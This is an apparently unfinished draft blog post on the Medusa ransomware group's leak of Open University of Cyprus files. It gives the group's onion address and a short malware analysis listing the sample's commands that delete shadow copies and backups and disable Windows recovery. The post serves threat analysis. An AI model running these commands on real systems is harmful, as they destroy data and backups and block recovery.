---
draft: true
---

Medusa Blog - Onion Link: `medusaxko7jxtrojdkxo66j7ck4q5tgktf7uqsqyfry4ebnxlcbkccyd.onion`



Leakage of files announcement 06/04/2023:

<img src="/home/ishtar/github/xmpf.github.io/content/posts/medusa-ransomware/assets/image-20230429213743557.png" alt="image-20230429213743557" style="zoom: 80%;" />



Example document provided as proof:

<img src="/home/ishtar/github/xmpf.github.io/content/posts/medusa-ransomware/assets/image-20230429215020922.png" alt="image-20230429215020922" style="zoom:50%;" />

Facebook post from the official account of Open University of Cyprus: 18/04/2023

<img src="/home/ishtar/github/xmpf.github.io/content/posts/medusa-ransomware/assets/image-20230429215649815.png" alt="image-20230429215649815" style="zoom:80%;" />





# Sample Analysis



SHA-256:



## Deleting Backups



```
vssadmin.exe Delete Shadows /All /Quiet
bcdedit.exe /set {default} recoveryenabled No
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
wbadmin DELETE SYSTEMSTATEBACKUP
wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest
wmic.exe SHADOWCOPY /nointeractive
```





## References



https://blog.cyble.com/2023/03/15/unmasking-medusalocker-ransomware/

https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-181a